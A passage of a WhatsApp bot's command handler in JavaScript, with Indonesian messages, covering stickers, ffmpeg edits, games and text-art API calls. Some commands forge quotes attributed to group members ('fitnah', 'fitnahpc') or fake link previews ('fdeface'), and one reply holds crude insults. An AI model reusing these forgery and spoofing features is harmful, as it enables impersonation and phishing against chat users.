          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
      case "Sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
      case "Totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        itsmevall.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
      case "Settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
      case "Fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await itsmevall.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await itsmevall.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
      case "Tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          itsmevall.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
      case "Fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            itsmevall.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
      case "Slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            itsmevall.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
      case "Reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          itsmevall.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case 'buttons5':
  case 'Buttons5':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
              itsmevall.relayWAMessage(prep)
              break
          case 'buttons6':
          case 'Buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
              itsmevall.relayWAMessage(prep)
              break
          case 'tod':
          case 'Tod':
              result =`*Truth Or Dare*\nPemain diberi pilihan antara menjawab pertanyaan dengan jujur, atau melakukan tantangan yang diberikan`
              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:ftex})
              itsmevall.relayWAMessage(prep)
              break
      case "anime":
      case "Anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'kalkulator':
case 'Kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				
				case 'fancytext':
				case 'Fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
	case 'halloween':
	case 'Halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   case 'Vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   case 'Codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
case 'Matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				case 'Googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				case 'Spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				case 'Express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				case 'Dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				case 'Blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				case 'Text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				case 'Warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				case 'Bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				case 'Pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
buttons = [{buttonId: `${prefix}pantun`,buttonText:{displayText: 'Next โก๏ธ'},type:1},{buttonId: `${prefix}command`,buttonText:{displayText: 'Back Menu๐น'},type:1}]
              buttonsMessage = { contentText: `${kata}`, footerText: `Created By ${fakeyoi}๐น`, buttons: buttons, headerType: 1 }
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:mek})
              itsmevall.relayWAMessage(prep)
			break
			
  	case 'artinama':
  case 'Artinama':	
  	  reply(mess.wait)
  rival = await fetchJson(`https://bx-hunter.herokuapp.com/api/artinama?nama=${args[0]}&apikey=${HunterApi}`, {method:'get'})
  slur = rival.result
   reply(slur)
   break
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
          case 'Waifu':
          case 'Loli':
          case 'Husbu':
          case 'Milf':
          case 'Cosplay':
          case 'Wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'๐คOWNER'},type:1}]
              imageMsg = ( await itsmevall.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak โ', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
   case'liriklagu':
   case'Liriklagu':
     reply(mess.wait)
  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
  apa2 = apa.result
  reply(apa2)
  break
case 'attp':
case 'Attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} itsmevall`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              itsmevall.sendMessage(from, buffer, sticker, { quoted: freply })
              break
				case 'resepmasakan':
				case 'Resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `โ *${anu.results.title}*\n\nโ Porsi : ${anu.results.servings}\nโ Waktu : ${anu.results.times}\nโ Kesulitan : ${anu.results.dificulty}\nโ Pengguna : ${anu.results.author.user}\nโ Tanggal Diterbitkan : ${anu.results.author.datePublished}\nโ Deskripsi : ${anu.results.desc}\n\nโโโโโโโโโโโโโโโโโโโโ\nโ *Tutorial*\n\nโ Bahan : ${anu.results.ingredient}\nโ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					case 'Githubstalk':
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `โ *GITHUB STALK*\n\nโ Name : ${anu.result.name}\nโ Followers : ${anu.result.followers}\nโ Following : ${anu.result.following}\nโ Id : ${anu.result.id}\nโ Node Id : ${anu.result.node_id}\nโ Type : ${anu.result.type}\nโ Company : ${anu.result.company}\nโ Location : ${anu.result.location}\nโ Bio : ${anu.result.bio}\nโ Site Admin : ${anu.result.site_admin}\nโ Email : ${anu.result.email}\nโ Created At : ${anu.result.created_at}\nโ Updated At : ${anu.result.updated_at}\nโ Twitter Username : ${anu.result.twitter_username}\nโ Blog : ${anu.result.blog}\nโ Avatar Url : ${anu.result.avatar_url}\nโ Gravatar Id : ${anu.result.gravatar_id}\nโ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
					case 'Infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `โ *INFO GEMPA*\n\nโ Waktu : ${anu.result.Waktu}\nโ Lintang : ${anu.result.Lintang}\nโ Bujur : ${anu.result.Bujur}\nโ Magnitudo : ${anu.result.Magnitudo}\nโ Kedalaman : ${anu.result.Kedalaman}\nโ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
      case "kontak":
      case "Kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        itsmevall.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
case 'antidelete':
case 'Antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return reply('Sudah diaktifkan sebelumnya!')
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('Sudah di NonAktifkan sebelumnya!')
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break
      case 'welcome':
      case 'Welcome':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(welcom)return reply('Sudah diaktifkan sebelumnya!')
welcom = true
reply(`Succes mengaktifkan welcome`)
} else if (args[0] === "off") {
if(!welcom)return reply('Sudah di NonAktifkan sebelumnya!')
welcom = false
reply(`Succes mematikan welcome`)
} else {
reply(`Pilih on atau off`)
}
break          
      case "take":
      case "colong":
      case "Take":
      case "Colong":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `SELF`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `BOT`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, itsmevall, mek, from);
        break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
      case "Stikerwm":
      case "Stickerwm":
      case "Swm":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              itsmevall.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                itsmevall.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              itsmevall.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                itsmevall.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;

      case "fdeface":
      case "Fdeface":
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await itsmevall.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await itsmevall.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        itsmevall.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
      case "Public":
        if (!isOwner && !mek.key.fromMe) return reply('*lu owner bukan kontol, babi, tai, memeg,*')
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        fakeyt(`ใ *PUBLIC-MODE* ใ`);
        break;
      case "self":
      case "Self":
        if (!isOwner && !mek.key.fromMe) return reply('*lu owner bukan kontol, babi, tai, memeg,*')
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakeyt(`ใ *SELF-MODE* ใ`);
        break;
      case "hidetag":
      case "Hidetag":
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await itsmevall.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        itsmevall.sendMessage(from, optionshidetag, text);
        break;
    

case 'play2':  
case 'Play2':   
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				play6 = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play6}&apikey=${zeksapi}`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*ใ PLAY VIDEO ใ*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`

				buffer1 = await getBuffer(anu.result.url_video)
				itsmevall.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})
					break  
					
      case "play":
      case "Play":
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          yta(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "video":
      case "Video":
        if (args.length === 0)
          return reply(
            `Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
      case "Sticker":
      case "Stiker":
      case "Sg":
      case "S":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
